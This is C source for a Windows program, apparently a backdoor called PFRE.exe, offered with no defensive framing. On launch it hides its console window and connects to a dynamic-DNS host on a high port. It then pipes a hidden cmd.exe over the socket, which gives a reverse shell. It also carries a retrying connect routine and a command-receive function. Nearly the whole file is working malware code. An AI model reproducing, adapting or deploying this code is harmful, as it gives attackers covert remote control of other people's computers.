//
// Created by M507 on 2/5/2019.
// 4/18
// PFRE.exe 

#include <winsock2.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "w2_32")
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
#define Father_IP "ritrit.ddns.net"
#define MAX_LENGTH 4096 //max number of bytes in a message
#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
#define bcopy(b1,b2,len) (memmove((b2), (b1), (len)), (void) 0)
#define BUFSIZE 4096
#define PING_PORT 65534

void connect2Father(){
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    struct hostent *host;
    host = gethostbyname(Father_IP);
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(65535);
    hax.sin_addr.s_addr =inet_addr(ip_addr);
    WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    //CREATE_NO_WINDOW
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &ini_processo, &processo_info);

    while (1) {
        switch (WaitForSingleObject(processo_info.hProcess, 0))
        {
            case WAIT_OBJECT_0:
                // process has terminated...
                exit(0);

            case WAIT_TIMEOUT:
                // process is still running...
                // 1 Min
                Sleep(60);
                break;
        }
    }

    //CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
}


int setup(SOCKET *Father_p){
    WSADATA wsd;
    char Buffer[BUFSIZE];
    int ret,n;
    struct sockaddr_in server;
    unsigned short port;
    struct hostent *host = NULL;
    START_EVERYTHING:
    /*Load Winsock DLL*/
    if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        printf("Winsock    initialization failed!\n");
        return 0;
    }
    /*Create Socket*/
    *Father_p = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*Father_p == INVALID_SOCKET) {
        printf("socket() : %d\n", WSAGetLastError());
        return 0;
    }
    /*Specify the server address*/
    server.sin_family = AF_INET;
    port = PING_PORT;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(Father_IP);
    if (server.sin_addr.s_addr == INADDR_NONE) {
        host = gethostbyname(Father_IP);    /// Enter the address man name, etc.)
        if (host == NULL) {
            printf("Unable to resolve server address: %s\n", Father_IP);
            return 0;
        }
        CopyMemory(&server.sin_addr,
                   host->h_addr_list[0],
                   host->h_length);
    }
    /* Establish a connection with the server */
    printf("Establishing a connection with the server\n");
    START_CONNECTING:
    if (connect(*Father_p, (struct sockaddr*)&server,
                sizeof(server)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        if (error == 10061) {
            goto START_CONNECTING;
        } else {
            printf("connect() failure: %d\n", WSAGetLastError());
        }
    }



    return 1;
}

//todo add error checking functionality.
char* w8(const SOCKET *Father_p,char *buffer){
    // n is for errors
    int n= 0;
    //Get the length of the next command
    n = recv(*Father_p, buffer, MAX_LENGTH+1,0);
    if ((n) == -1){
        fprintf(stderr, "recv: %s (%d)\n", strerror(errno), errno);
        //clean buffer as an indication of a problem
        memset(buffer, 0, MAX_LENGTH);
        return buffer;
    }
    printf("%s\n",buffer);
    return buffer;
}

void hide(){
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );  //won't hide the window without SW_MINIMIZE
    ShowWindow( hWnd, SW_HIDE );
}


int main(int argc, char *argv[]){
    hide();
    connect2Father();
}